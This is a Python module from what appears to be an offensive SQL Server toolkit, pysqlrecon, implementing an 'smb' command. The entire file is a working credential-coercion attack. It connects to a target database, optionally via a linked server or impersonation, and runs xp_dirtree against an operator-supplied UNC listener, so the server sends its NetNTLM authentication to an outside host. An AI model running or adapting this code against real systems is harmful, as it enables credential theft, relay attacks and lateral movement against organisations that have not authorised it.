import typer

from pysqlrecon.logger import logger
from pysqlrecon.lib import PySqlRecon

app = typer.Typer()
COMMAND_NAME = "smb"
HELP = "[bright_black][NORM][/] Coerce NetNTLM auth via xp_dirtree [I,L]"
LINK_COMPATIBLE = True
IMPERSONATE_COMPATIBLE = True


@app.callback(invoke_without_command=True, no_args_is_help=True)
def main(
    ctx: typer.Context,
    listener: str = typer.Option(..., '--listener', help='UNC path to SMB listener')):
    
    pysqlrecon: PySqlRecon = ctx.obj['pysqlrecon']

    # verify opts are compatible with module before connecting
    if not PySqlRecon.validate_opts(
        LINK_COMPATIBLE,
        IMPERSONATE_COMPATIBLE,
        pysqlrecon.link,
        pysqlrecon.impersonate
    ):
        exit()

    pysqlrecon.connect()

    if pysqlrecon.link is not None:
        logger.info(f"Triggering SMB request to {listener} on {pysqlrecon.link} via {pysqlrecon.target}")
    else:
        logger.info(f"Triggering SMB request to {listener} on {pysqlrecon.target}")
    
    query = f"EXEC master..xp_dirtree '{listener}';"
    if pysqlrecon.link is not None:
        query = "SELECT 1; " + query
    
    pysqlrecon.query_handler(query)
    logger.info("SMB request triggered")

    pysqlrecon.disconnect()